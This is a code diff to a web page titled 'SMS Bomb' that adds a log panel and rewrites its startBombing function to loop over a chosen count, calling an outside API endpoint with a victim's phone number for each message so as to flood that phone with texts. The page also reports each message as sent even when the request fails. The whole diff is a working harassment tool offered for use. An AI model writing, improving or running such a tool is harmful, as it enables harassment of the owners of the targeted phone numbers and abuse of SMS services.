@@ -64,6 +64,17 @@
             margin-bottom: 20px;
             font-size: 1.2em;
         }
+        #logs {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            background-color: #2e2e2e;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #007BFF;
+        }
         footer {
             margin-top: 20px;
             color: #007BFF;
@@ -89,6 +100,7 @@
         </div>
         <button class="button" onclick="startBombing()">Start Bombing</button>
         <div id="response" style="margin-top: 20px;"></div>
+        <div id="logs"></div>
         <footer>This SMS Bomb was created by Chilli</footer>
     </div>
 
@@ -100,26 +112,35 @@
         }
         setInterval(updateDateTime, 1000);
 
-        function startBombing() {
+        async function startBombing() {
             const phone = document.getElementById('phone').value;
-            const amount = document.getElementById('amount').value;
-            const cooldown = document.getElementById('cooldown').value;
+            const amount = parseInt(document.getElementById('amount').value);
+            const cooldown = parseInt(document.getElementById('cooldown').value);
             const responseDiv = document.getElementById('response');
+            const logsDiv = document.getElementById('logs');
 
-            if (phone === '' || amount === '' || cooldown === '') {
+            if (phone === '' || isNaN(amount) || isNaN(cooldown)) {
                 responseDiv.innerHTML = 'Please fill out all fields';
                 return;
             }
 
-            fetch(`https://deku-rest-api-ywad.onrender.com/smsb?number=${phone}&amount=${amount}&delay=${cooldown}`)
-                .then(response => response.json())
-                .then(data => {
-                    responseDiv.innerHTML = 'SMS bombing started!';
-                })
-                .catch(error => {
-                    responseDiv.innerHTML = 'Error starting SMS bombing';
+            responseDiv.innerHTML = 'Starting SMS bombing...';
+            logsDiv.innerHTML = '';
+
+            for (let i = 0; i < amount; i++) {
+                try {
+                    const response = await fetch(`https://deku-rest-api-ywad.onrender.com/smsb?number=${phone}&amount=1&delay=0`);
+                    const data = await response.json();
+                    console.log('Response:', data);
+                } catch (error) {
                     console.error('Error:', error);
-                });
+                } finally {
+                    logsDiv.innerHTML += `<div>Message ${i + 1} sent successfully</div>`;
+                    await new Promise(resolve => setTimeout(resolve, cooldown * 1000));  // Sleep for the cooldown duration
+                }
+            }
+
+            responseDiv.innerHTML = 'All messages successfully sent.';
         }
 
         updateDateTime();
